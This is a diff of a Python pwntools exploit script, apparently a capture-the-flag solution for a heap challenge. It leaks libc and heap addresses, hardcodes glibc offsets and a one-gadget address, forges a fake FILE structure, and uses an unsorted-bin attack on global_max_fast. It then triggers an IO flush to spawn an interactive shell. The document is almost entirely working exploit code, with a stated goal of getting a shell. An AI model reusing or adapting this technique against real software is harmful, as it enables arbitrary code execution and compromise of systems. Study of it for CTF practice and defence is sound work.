@@ -98,6 +98,7 @@ def build_fake_file(addr,vtable):
 def pwn():
 
     #pdbg.bp([0x13ea,0x148a])
+    gdb.attach(p)
     insert(0x40,'a'*0x40) #0
     insert(0x40,'b'*0x40) #1
     insert(0x40,'c'*0x40) #2
@@ -118,32 +119,35 @@ def pwn():
     merge(0,0) # 7
     merge(2,2) # 0
 
-
     ## step 1 leak libc address and heap address
     #pdbg.bp([0x120c,0x1052])
     view(7)
-    p.recvuntil(":n")
+    p.recvuntil(":\n")
 
     unsorted_addr=u64(p.recv(8))
-    libc_base=unsorted_addr-libc.symbols['main_arena']-88
+    main_arena_offset = 0x3c4b20
+    global_max_fast_offset = 0x3c67f8
+    io_stderr_offset = 0x3c5540
+    libc_base = unsorted_addr - main_arena_offset - 0x58
     heap_base=u64(p.recv(8))-0x120
     #pdbg.bp([0x120c,0x123f,0x1052])
     log.info("leak libc base: %s"%hex(libc_base))
     log.info("leak heap base: %s"%hex(heap_base))
-    global_max_fast=libc_base+libc.symbols['global_max_fast']
-    io_stderr=libc_base+libc.symbols['_IO_2_1_stderr_']
-    rce=libc_base+0xd5c07  
+    global_max_fast=libc_base + global_max_fast_offset
+    io_stderr=libc_base + io_stderr_offset
+    rce=libc_base+0xf1147 #f02a4 #4526a  
     #pdbg.bp([0x1216,0x13ea]) 
     heap_addr=heap_base+0x1b90
+    log.info("heap address:" + hex(heap_addr))
     fake_file=build_fake_file(io_stderr,heap_addr)
     ## step 2 build a fake file
     update(6,0x1000-0x10,fake_file[0x10:].ljust(0x1000-0x10,'f'))
     ## step 3 form a 0x1410 big chunk with merge funcion
-    merge(5,6)
+    merge(5,6) # 2
 
     ## step 4 unsorted bin attack to overwrite global_max_fast
-    update(7,0x10,p64(unsorted_addr)+p64(global_max_fast-0x10))
-    insert(0x40,'a'*0x40) 
+    update(7,0x10,p64(unsorted_addr)+p64(global_max_fast-0x10)) # 5
+    insert(0x40,'a'*0x40) # 6 
     #pdbg.bp([0x123f,0x15ce])
     update(9,0x60,p64(0)*2+p64(rce)*(0x50/8))
     #pdbg.bp(0x15ce)
@@ -153,9 +157,11 @@ def pwn():
 
     ## step 6 trigger io flush to get shell
     p.recvuntil(":")
-    p.sendline('1')
-    p.recvuntil(":")
-    p.sendline("100")
+    p.sendline('7')
+    #p.sendline('1')
+    #p.recvuntil(":")
+    #p.sendline("100")
+    #raw_input()
     p.interactive() #get the shell
 
 if __name__ == '__main__':
